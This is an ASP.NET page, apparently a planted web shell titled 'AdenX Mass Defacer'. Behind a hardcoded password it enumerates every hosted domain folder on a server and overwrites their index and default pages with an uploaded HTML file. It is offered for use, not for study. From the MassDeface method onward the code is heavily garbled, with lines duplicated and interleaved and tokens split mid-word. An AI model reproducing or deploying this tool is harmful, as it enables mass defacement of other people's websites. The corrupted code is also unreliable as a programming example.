<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Collections.Generic" %>

<script runat="server">
    
    // MASS DEFACER TOOL - AdenXIndonet 🩸🔥
    // Versi .NET 4.0 Compatible (gak pake $ string interpolation)
    
    protected void Page_Load(object sender, EventArgs e)
    {
        Response.ContentType = "text/html";
        
        string action = Request.QueryString["action"];
        string targetFile = Request.QueryString["file"];
        string pass = Request.QueryString["pass"];
        
        // Password proteksi (biar gak sembarang orang pake)
        if (pass != "AdenX2025")
        {
            ShowForm();
            return;
        }
        
        if (action == "deface" && Request.Files.Count > 0)
        {
            // Proses upload dan mass deface
            MassDeface();
        }
        else if (action == "list")
        {
            // List semua domain
            ListDomains();
        }
        else if (action == "restore" && !string.IsNullOrEmpty(targetFile))
        {
            // Restore file asli (kalo ada backup)
            RestoreFile(targetFile);
        }
        else
        {
            ShowForm();
        }
    }
    
    private void ShowForm()
    {
        Response.Write(@"
        <!DOCTYPE html>
        <html>
        <head>
            <title>AdenX Mass Defacer</title>
            <style>
                body{background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px;}
                .container{max-width:600px;margin:0 auto;border:1px solid #00ff00;padding:20px;}
                input,textarea,select{width:100%;margin:10px 0;background:#1a1a1a;color:#00ff00;border:1px solid #00ff00;padding:8px;}
                input[type=submit]{background:#00ff00;color:#000;cursor:pointer;font-weight:bold;}
                .info{color:#0ff;font-size:12px;}
                .title{text-align:center;color:#f0f;font-size:24px;margin-bottom:20px;}
            </style>
        </head>
        <body>
            <div class='container'>
                <div class='title'>🔥 MASS DEFACER 🔥</div>
                <div class='info'>Target: E:\New_Files\ (SEMUA DOMAIN)</div>
                <div class='info'>" + GetDomainCount() + @" domain ditemukan</div>
                
                <form method='post' enctype='multipart/form-data'>
                    <input type='hidden' name='action' value='deface'>
                    <input type='hidden' name='pass' value='AdenX2025'>
                    
                    <label>File HTML Deface:</label>
                    <input type='file' name='defaceFile' accept='.html,.htm' required>
                    
                    <label>Target filename (kosongin biar otomatis):</label>
                    <input type='text' name='targetName' placeholder='index.html / default.aspx / dll'>
                    
                    <label>Opsi:</label>
                    <select name='option'>
                        <option value='all'>Semua domain (full force)</option>
                        <option value='index'>Cuma ganti index.html</option>
                        <option value='default'>Cuma ganti default.aspx</option>
                        <option value='backup'>Backup dulu baru ganti</option>
                    </select>
                    
                    <input type='submit' value='🔥 MASS DEFACE NOW! 🔥'>
                </form>
                
                <br>
                <div class='info'><a href='?action=list&pass=AdenX2025' style='color:#0ff;'>📋 List Semua Domain</a></div>
            </div>
        </body>
        </html>
        ");
    }
    
    private int GetDomainCount()
    {
        try
        {
            string basePath = @"E:\New_Files\";
            if (Directory.Exists(basePath))
            {
                return Directory.GetDirectories(basePath).Length;
            }
        }
        catch { }
        return 0;
    }
    
    private void ListDomains()
    {
        try
        {
            string basePath = @"E:\New_Files\";
            Response.Write("<pre style='background:#000;color:#0f0;padding:10px;'>");
            Response.Write("📋 DAFTAR SEMUA DOMAIN:\n");
            Response.Write("========================\n\n");
            
            if (Directory.Exists(basePath))
            {
                string[] domains = Directory.GetDirectories(basePath);
                int i = 1;
                foreach (string domain in domains)
                {
                    string domainName = Path.GetFileName(domain);
                    Response.Write(i.ToString() + ". " + domainName + "\n");
                    i++;
                }
                Response.Write("\nTotal: " + domains.Length.ToString() + " domain\n");
            }
            else
            {
                Response.Write("Folder E:\\New_Files\\ tidak ditemukan!\n");
            }
            
            Response.Write("\n\n<a href='?pass=AdenX2025'>⬅ Kembali</a>");
            Response.Write("</pre>");
        }
        catch (Exception ex)
        {
            Response.Write("Error: " + ex.Message);
        }
    }
    
    private void MassDeface()
    {
        try
        {
            Response.ContentType = "text/html";
            Response.Write("<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'>");
            Response.Write("<h2 style='color:#f0f;'>🔥 MASS DEFACE EXECUTION 🔥</h2>");
            Response.Write("<pre>");
            
            HttpPostedFile file = Request.Files[0];
            string targetName = Request.Form["targetName"];
            string option = Request.Form["option"] ?? "all";
            
            if (file == null || file.ContentLength == 0)
            {
                Response.Write("❌ File kosong!\n");
                Response.Write("</pre><a href='?pass=AdenXdenX20252025'>⬅ Kembali'>⬅ Kembali</a</a></body></body></html></html>");
>");
                return                return;
           ;
            }
            
 }
            
            //            // Baca Baca file HTML file HTML
           
            byte[] byte[] fileData = new fileData = new byte byte[file.Content[file.ContentLength];
Length];
            file.InputStream.Read(fileData            file.InputStream.Read(fileData, , 0,0, file.Content file.ContentLength);
Length);
            string            string fileContent fileContent = Encoding = Encoding.UTF8.GetString(fileData);
            
            // T.UTF8.GetString(fileData);
            
            // Tentukan nama target
entukan nama target
            if            if (string (string.IsNullOrEmpty.IsNullOrEmpty(targetName(targetName))
           ))
            {
                {
                targetName = Path targetName = Path.Get.GetFileNameFileName(file.FileName);
(file.FileName);
                if                if (string.IsNullOrEmpty (string.IsNullOrEmpty(targetName))
                   (targetName))
                    targetName targetName = " = "index.htmlindex.html";
           ";
            }
            
            string }
            
            string basePath basePath = @" = @"E:\New_FE:\New_Files\iles\";
            
";
            
            if (!Directory            if (!Directory.Exists.Exists(basePath(basePath))
           ))
            {
                {
                Response.Write(" Response.Write("❌ Folder❌ Folder E:\\New_F E:\\New_Files\\iles\\ tidak ditem tidak ditemukan!\n");
                Responseukan!\n");
                Response.Write("</.Write("</prepre><a><a href=' href='?pass=Aden?pass=AdenX202X2025'>5'>⬅ Kemb⬅ Kembali</ali</a></a></body></html>body></html>");
               ");
                return;
 return;
            }
            
                       }
            
            // D // Dapatkanapatkan semua folder domain
 semua folder domain
            string            string[] domains[] domains = Directory = Directory.GetDirect.GetDirectories(basePath);
            Responseories(basePath);
            Response.Write(".Write("🎯 Target🎯 Target: " + domains.Length.ToString(): " + domains.Length.ToString() + " + " domain\n domain\n");
           ");
            Response.Write Response.Write("("📄 File: "📄 File: " + target + targetName + "\nName + "\");
           n");
            Response.Write Response.Write("⚙️("⚙️ Opsi Opsi: ": " + option + + option + "\ "\n");
n");
            Response            Response.Write("========================\.Write("========================\n\nn\n");
            
            int");
            
            int success = success = 0 0;
            int failed;
            int failed =  = 0;
0;
            
                       
            foreach ( foreach (string domainstring domain in domains)
            in domains)
            {
                string domain {
                string domainName =Name = Path.Get Path.GetFileName(FileName(domain);
domain);
                
                               
                try
 try
                {
                {
                    Response.Write("                    Response.Write("📁📁 " + " + domainName domainName + "... + "... ");
 ");
                    
                                       
                    // T // Tentukan fileentukan file yang akan yang akan ditim ditimpa berdasarkanpa berdasarkan opsi
                    opsi string[] targetFiles
                    string[] targetFiles = GetTargetFiles = GetTargetFiles(domain(domain, target, targetName,Name, option);
 option);
                    
                                       
                    foreach ( foreach (stringstring target targetFile inFile in targetFiles targetFiles)
                   )
                    {
                        {
                        // Backup // Backup kalo kalo opsi backup
                        if opsi backup
                        if (option (option == "backup == "backup" &&" && File. File.Exists(targetExists(targetFile))
                        {
File))
                        {
                            string                            string backupFile backupFile = target = targetFile +File + ". ".backbackup_"up_" + DateTime + DateTime.Now.T.Now.Ticks.ToStringicks.ToString();
                           ();
                            File.C File.Copy(targetopy(targetFile, backupFileFile, backupFile);
                           );
                            Response.Write Response.Write("[BACK("[BACKUP]UP] ");
                        ");
                        }
                        
 }
                        
                        //                        // Tulis Tulis file def file deface
                        File.WriteAllace
                        File.WriteAllBytes(targetBytes(targetFile, fileDataFile, fileData);
                       );
                        Response.Write Response.Write("✔("✔ " + " + Path.GetFileName(target Path.GetFileName(targetFile)File) + " + " ");
                    ");
                    }
                    
 }
                    
                    Response                    Response.Write(".Write("✅\✅\nn");
");
                    success                    success++;
                }
                catch (Exception ex)
                {
                    string++;
                }
                catch (Exception ex)
                {
                    string errMsg = errMsg = ex.Message ex.Message;
                   ;
                    if ( if (errMsgerrMsg.Length >.Length > 30) err 30Msg =) errMsg = errMsg errMsg.Substring.Substring(0(0, , 30)30) + "... + "...";
                   ";
                    Response.Write Response.Write("("❌ ("❌ (" + errMsg + ")\ + errMsg + ")\n");
n");
                    failed                    failed++;
               ++;
                }
            }
            
 }
            }
            
            Response            Response.Write("\.Write("\n========================n========================\n\n");
           ");
            Response.Write("✅ Response.Write("✅ BERH BERHASILASIL: " + success: ".ToString() + success.ToString() + " + " domain\n domain\n");
            Response.Write");
            Response.Write("("❌ G❌ GAGALAGAL: ": " + failed + failed.ToString() +.ToString() + " " domain\n domain\n");
            
            if (");
            
            if (failedfailed >  > 0)
0)
            {
            {
                Response                Response.Write("\.Write("\n⚠️ Ben⚠️ Beberapa domainberapa domain gagal gagal: (: (permissionpermission denied / denied / folder kos folder kosong)\ong)\n");
n");
            }
            }
            
                       
            Response.Write Response.Write("\n("\n🎉🎉 MASS MASS DEFACE COMPL DEFACE COMPLETE!ETE! 🎉\ 🎉\n");
n");
            Response            Response.Write("</pre.Write("</pre>");
>");
            Response            Response.Write("<br.Write("<br><a href><a href='?='?pass=AdenXpass=AdenX20252025' style' style='color='color:#0:#0f0f0;'>;'>⬅⬅ Kembali ke Kembali ke menu</ menu</a>");
            Responsea>");
            Response.Write("</.Write("</body></body></html>html>");
");
               }
        }
        catch ( catch (Exception exException ex)
       )
        {
            Response.Write {
            Response.Write("("❌ FAT❌ FATAL ERROR: "AL ERROR: " + ex + ex.Message +.Message + "\n "\n");
           ");
            Response.Write Response.Write("</pre("</><a hrefpre><a href='?='?pass=Apass=AdenXdenX20252025'>'>⬅ K⬅ Kembali</a></bodyembali</a></body></html>></html>");
");
        }
        }
    }
    }
    
       
    private string[] Get private string[] GetTargetFilesTargetFiles(string domain(string domainPath,Path, string default string defaultName,Name, string option string option)
   )
    {
        {
        List<string List<string> files = new List<string> files = new List<string>();
        
>();
        
        switch        switch (option (option)
        {
           )
        {
            case " case "index":
index":
                files                files.Add(.Add(Path.Path.Combine(domainPath,Combine(domainPath "index.html, "index.html"));
               "));
                files.Add files.Add(Path(Path.Combine.Combine(domain(domainPath, "indexPath,.htm"));
 "index.htm"));
                break                break;
                
;
                
            case            case "default "default":
                files":
                files.Add(Path.Add(Path.Combine(domainPath, "default.aspx"));
.Combine(domainPath, "default.aspx"));
                files                files.Add(.Add(PathPath..Combine(Combine(domainPathdomainPath, "Default.aspx"));
               , "Default.aspx"));
                files.Add files.Add(Path(Path.Combine.Combine(domain(domainPath,Path, "default "default.asp"));
.asp"));
                break                break;
                
            case;
                
            case "all "all":
           ":
            default:
 default:
                //                // Cari semua kemungkinan Cari semua kemungkinan file index
 file index
                               string[] string[] possibleFiles possibleFiles = {
 = {
                    "                    "index.html", "index.html", "index.htmindex.htm", "default.aspx", "default.aspx", "", "Default.aspxDefault.aspx",
                   ",
                    "default.asp", "default.asp", "index "index.php",.php", "home "home.html",.html", "main.aspx",
 "main.aspx",
                    default                    defaultName
Name
                };
                };
                
                               
                // P // Pake loop manual biake loop manual biar gak par gak pake LINake LINQ (Q (komkompatibelpatibel .NET  .NET 4.4.0)
0)
                List                List<string><string> distinct distinctFiles =Files = new List<string>();
 new List<string>();
                foreach                foreach (string (string f in possible f in possibleFiles)
Files)
                {
                {
                    if                    if (!string (!string.IsNullOrEmpty(f).IsNullOrEmpty(f) && !dist && !distinctinctFiles.ContainsFiles.Contains(f))
(f))
                    {
                    {
                        distinctFiles.Add                        distinctFiles.Add(f);
                    }
(f);
                    }
                }
                }
                
                               
                foreach (string file foreach (string file in distinct in distinctFiles)
Files)
                {
                {
                    files.Add(                    files.Add(Path.Combine(Path.Combine(domainPathdomainPath, file, file));
               ));
                }
                break;
 }
                break;
        }
        
               }
        
        // Return array // Return array
       
        return files.To return files.ToArrayArray();
   ();
    }
    
 }
    
    private void Rest    private void RestoreFile(string fileoreFile(string filePath)
Path)
    {
        try
           {
        try
        {
            string dir {
            string dir = Path = Path.GetDirectory.GetDirectoryName(filePath);
Name(filePath);
            string            string fileName = fileName = Path.GetFileName(file Path.GetFileName(filePath);
Path);
            string pattern            string pattern = fileName = fileName + ". + ".backup_*backup_*";
            
";
            
            string[] backups            string[] backups = Directory = Directory.GetFiles.GetFiles(dir,(dir, pattern);
            
            pattern);
            
            if ( if (backupsbackups.Length >.Length > 0 0)
           )
            {
                File.C {
               opy( File.Copy(backupsbackups[0[0], file], filePath,Path, true);
 true);
                Response                Response.Write(".Write("✅ Restored: " +✅ Restored: Path.Get " +FileName(file Path.GetPath) + "FileName(filePath) + " from backup from backup\n");
            }
\n");
            }
            else            else
           
            {
                Response.Write {
                Response.Write("❌ No backup found("❌ No backup found\n");
\n");
            }
            }
        }
        }
        catch        catch (Exception ex)
        {
 (Exception ex)
        {
            Response            Response.Write(".Write("❌❌ Restore Restore error: error: " + " + ex.Message ex.Message + "\ + "\n");
n");
        }
        }
    }
    }
    
</    
</script>
script>